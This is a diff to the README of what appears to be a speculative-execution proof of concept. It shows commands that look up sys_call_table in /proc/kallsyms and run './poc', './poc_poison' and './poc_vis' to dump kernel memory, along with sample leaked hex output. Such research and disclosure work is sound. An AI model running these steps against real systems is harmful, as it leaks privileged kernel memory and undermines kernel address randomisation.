@@ -5,25 +5,26 @@ Read kernel addresses by stalling the pipeline and speculatively hitting a cache
 
 ```
 $ make
-cc -o poc poc.c -O0 -lm 
-$ grep init_top_pgt /proc/kallsyms 
-ffffffffa2c09000 D init_top_pgt
-$ ./poc ffffffffa2c09870  # skip some because it's mostly zeros
-0xffffffffa2c09870 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
-0xffffffffa2c09880 | 67 20 21 b3 03 00 00 00 00 00 00 00 00 00 00 00 
-0xffffffffa2c09890 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
-0xffffffffa2c098a0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+...
+$ grep ' sys_call_table' /proc/kallsyms
+ffffffff8f800180 R sys_call_table
+$ ./poc ffffffff8f800180
+0xffffffff8f800180 | 10 40 23 8f ff ff ff ff d0 40 23 8f ff ff ff ff
+0xffffffff8f800190 | c0 14 23 8f ff ff ff ff 60 f6 22 8f ff ff ff ff
+0xffffffff8f8001a0 | 40 91 23 8f ff ff ff ff 70 91 23 8f ff ff ff ff
+0xffffffff8f8001b0 | 50 91 23 8f ff ff ff ff 10 af 24 8f ff ff ff ff
 ...
 ```
 
 Read kernel addresses by poisoning the branch predictor and speculatively hitting a cacheline:
 ```
-$ ./poc_poison 0xffffffffa2c09880
-0xffffffffa2c09880 | 67 20 21 b3 03 00 00 00 00 00 00 00 00 00 00 00 
+$ ./poc_poison ffffffff8f800180
+cutoff: 192
+0xffffffff8f800180 | 10 40 23 8f ff ff ff ff d0 40 23 8f ff ff ff ff
 ...
 ```
 
 Visualize memory read timings:
 ```
-$ ./poc_vis 0xffffffffa2c09883
+$ ./poc_vis ffffffff8f800180
 ```
